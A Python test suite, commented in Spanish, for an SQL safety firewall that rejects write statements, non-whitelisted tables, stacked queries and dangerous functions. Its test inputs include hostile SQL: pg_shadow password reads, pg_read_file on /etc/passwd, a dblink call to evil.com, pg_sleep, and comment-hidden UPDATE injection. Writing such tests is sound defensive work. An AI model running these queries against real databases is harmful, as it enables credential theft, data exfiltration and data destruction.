"""
Tests exhaustivos para el Cortafuegos Semántico AST (app/core/safety.py).
Valida:
1. Rechazo de DDL/DML y consultas multi-statement.
2. Lista blanca de tablas de negocio (bloqueo de pg_shadow, information_schema, etc.).
3. Resolución de CTEs (Common Table Expressions).
4. Bloqueo de funciones de exfiltración o DoS (pg_sleep, pg_read_file, etc.).
5. Forzado y recorte de LIMIT de seguridad.
"""

import pytest

from app.core.safety import (
    enforce_limit,
    is_safe_select,
    validate_and_prepare,
    UnsafeQueryError,
    NonSelectQueryError,
    TableNotAllowedError,
    DangerousFunctionError,
)


# ==============================================================================
# 1. Tests Básicos de Sentencia Única SELECT y DDL/DML (Regresiones protegidas)
# ==============================================================================

def test_valid_select_is_safe():
    sql = "SELECT * FROM invoices WHERE status = 'overdue';"
    assert is_safe_select(sql) is True


def test_drop_table_is_rejected():
    sql = "DROP TABLE invoices;"
    assert is_safe_select(sql) is False
    with pytest.raises(NonSelectQueryError):
        validate_and_prepare(sql, max_rows=100)


def test_delete_is_rejected():
    sql = "DELETE FROM invoices WHERE invoice_id = 1;"
    assert is_safe_select(sql) is False
    with pytest.raises(NonSelectQueryError):
        validate_and_prepare(sql, max_rows=100)


def test_select_with_subquery_insert_is_rejected():
    """Caso trampa: un SELECT que esconde un INSERT vía statement múltiple."""
    sql = "SELECT * FROM invoices; INSERT INTO invoices (amount) VALUES (999);"
    assert is_safe_select(sql) is False
    with pytest.raises(NonSelectQueryError):
        validate_and_prepare(sql, max_rows=100)


def test_update_disguised_as_comment_is_rejected():
    sql = "SELECT * FROM invoices; -- ok\nUPDATE invoices SET amount = 0;"
    assert is_safe_select(sql) is False
    with pytest.raises(NonSelectQueryError):
        validate_and_prepare(sql, max_rows=100)


# ==============================================================================
# 2. Tests de Lista Blanca de Tablas (Schema & Information Leakage Firewall)
# ==============================================================================

def test_allowed_single_table_query():
    sql = "SELECT full_name, email FROM customers WHERE country = 'Colombia';"
    result = validate_and_prepare(sql, max_rows=50)
    assert "FROM customers" in result
    assert "LIMIT 50" in result


def test_allowed_multi_table_join():
    sql = """
    SELECT c.full_name, i.amount, p.amount_paid
    FROM customers c
    JOIN invoices i ON c.customer_id = i.customer_id
    JOIN payments p ON i.invoice_id = p.invoice_id
    WHERE i.status = 'paid';
    """
    result = validate_and_prepare(sql, max_rows=100)
    assert "LIMIT 100" in result


def test_unauthorized_pg_shadow_rejected():
    sql = "SELECT usename, passwd FROM pg_shadow;"
    with pytest.raises(TableNotAllowedError) as exc_info:
        validate_and_prepare(sql, max_rows=100)
    assert "pg_shadow" in str(exc_info.value)


def test_unauthorized_information_schema_rejected():
    sql = "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';"
    with pytest.raises(TableNotAllowedError) as exc_info:
        validate_and_prepare(sql, max_rows=100)
    assert "tables" in str(exc_info.value)


def test_internal_rag_table_rejected():
    """La tabla schema_embeddings es del motor RAG, no debe ser consultable por el usuario."""
    sql = "SELECT object_name, description FROM schema_embeddings;"
    with pytest.raises(TableNotAllowedError) as exc_info:
        validate_and_prepare(sql, max_rows=100)
    assert "schema_embeddings" in str(exc_info.value)


def test_union_with_unauthorized_table_rejected():
    sql = "SELECT full_name FROM customers UNION SELECT usename FROM pg_user;"
    with pytest.raises(TableNotAllowedError) as exc_info:
        validate_and_prepare(sql, max_rows=100)
    assert "pg_user" in str(exc_info.value)


# ==============================================================================
# 3. Tests de CTE (Common Table Expressions) y Subconsultas
# ==============================================================================

def test_cte_with_allowed_tables_pass():
    sql = """
    WITH overdue_invoices AS (
        SELECT customer_id, amount FROM invoices WHERE status = 'overdue'
    )
    SELECT c.full_name, oi.amount
    FROM customers c
    JOIN overdue_invoices oi ON c.customer_id = oi.customer_id;
    """
    result = validate_and_prepare(sql, max_rows=100)
    assert "LIMIT 100" in result
    assert "overdue_invoices" in result


def test_cte_with_unauthorized_table_rejected():
    sql = """
    WITH secret_data AS (
        SELECT usename, passwd FROM pg_shadow
    )
    SELECT * FROM secret_data;
    """
    with pytest.raises(TableNotAllowedError) as exc_info:
        validate_and_prepare(sql, max_rows=100)
    assert "pg_shadow" in str(exc_info.value)


# ==============================================================================
# 4. Tests de Funciones Peligrosas (DoS / Exfiltración)
# ==============================================================================

def test_pg_sleep_dos_rejected():
    sql = "SELECT pg_sleep(5), invoice_id FROM invoices;"
    with pytest.raises(DangerousFunctionError) as exc_info:
        validate_and_prepare(sql, max_rows=100)
    assert "pg_sleep" in str(exc_info.value)


def test_pg_read_file_exfiltration_rejected():
    sql = "SELECT pg_read_file('/etc/passwd') FROM customers;"
    with pytest.raises(DangerousFunctionError) as exc_info:
        validate_and_prepare(sql, max_rows=100)
    assert "pg_read_file" in str(exc_info.value)


def test_dblink_lateral_movement_rejected():
    sql = "SELECT * FROM dblink('host=evil.com', 'SELECT 1') AS t(id int);"
    with pytest.raises((DangerousFunctionError, TableNotAllowedError)):
        validate_and_prepare(sql, max_rows=100)


# ==============================================================================
# 5. Tests de Forzado y Recorte de LIMIT
# ==============================================================================

def test_enforce_limit_adds_limit_when_missing():
    sql = "SELECT * FROM invoices"
    result = enforce_limit(sql, max_rows=100)
    assert "LIMIT 100" in result


def test_enforce_limit_keeps_limit_below_max():
    sql = "SELECT * FROM invoices LIMIT 50"
    result = enforce_limit(sql, max_rows=100)
    assert "LIMIT 50" in result


def test_enforce_limit_caps_limit_above_max():
    sql = "SELECT * FROM invoices LIMIT 1000000"
    result = enforce_limit(sql, max_rows=100)
    assert "LIMIT 100" in result
    assert "1000000" not in result


def test_enforce_limit_handles_non_numeric_limit_safely():
    """Valida que cláusulas como LIMIT ALL o expresiones no rompan el sistema con error 500."""
    sql = "SELECT * FROM invoices LIMIT ALL"
    result = enforce_limit(sql, max_rows=100)
    assert "LIMIT 100" in result
    assert "ALL" not in result

    sql_expr = "SELECT * FROM invoices LIMIT 10 + 5"
    result_expr = enforce_limit(sql_expr, max_rows=100)
    assert "LIMIT 100" in result_expr

